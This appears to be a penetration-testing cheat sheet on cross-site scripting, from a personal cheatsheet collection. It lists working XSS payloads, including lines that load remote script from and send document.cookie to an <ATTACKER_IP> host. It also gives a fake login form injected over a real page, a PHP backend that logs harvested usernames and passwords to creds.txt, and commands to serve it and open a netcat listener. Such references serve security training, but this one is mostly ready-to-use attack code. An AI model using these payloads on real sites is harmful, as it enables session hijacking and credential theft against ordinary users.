# Cross-Site Scripting (XSS)

## Basic Payloads

```html
<script>alert(window.origin)</script>
<plaintext>
<script>print()</script>
<img src="" onerror=alert(window.origin)>
```

## Page Manipulation (proving DOM control)

```html
<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://target.com/logo.svg"</script>
<script>document.title = 'Pwned'</script>
<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>
<script>document.getElementById('urlform').remove();</script>
```

## Remote Script Loading & Exfiltration

```html
<script src="http://<ATTACKER_IP>/script.js"></script>
<script>new Image().src='http://<ATTACKER_IP>/index.php?c='+document.cookie</script>
```

## Credential Phishing via XSS

Inject a fake login form over the real page to harvest credentials:

```html
document.write('<h3>Please login to continue</h3><form action=http://<ATTACKER_IP>><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

**Capture backend (`index.php`):**
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://<TARGET>/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

**Serve it:**
```bash
mkdir /tmp/tmpserver && cd /tmp/tmpserver
# write index.php above
sudo php -S 0.0.0.0:80
```

The injected payload gets URL-encoded and delivered through the vulnerable parameter, e.g.:
```
http://<TARGET>/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write(...)%3C%2Fscript%3E
```

## Tooling

| Command | Description |
|---|---|
| `python xsstrike.py -u "http://<TARGET>:<PORT>/index.php?task=test"` | Automated XSS discovery on a URL parameter |
| `sudo nc -lvnp 80` | Basic listener for simpler payloads |
| `sudo php -S 0.0.0.0:80` | Lightweight server for hosting a phishing/capture page |

---

<div align="center">

*Part of the [D4RKGUNN3R Cheatsheets](./README.md) collection.*

</div>
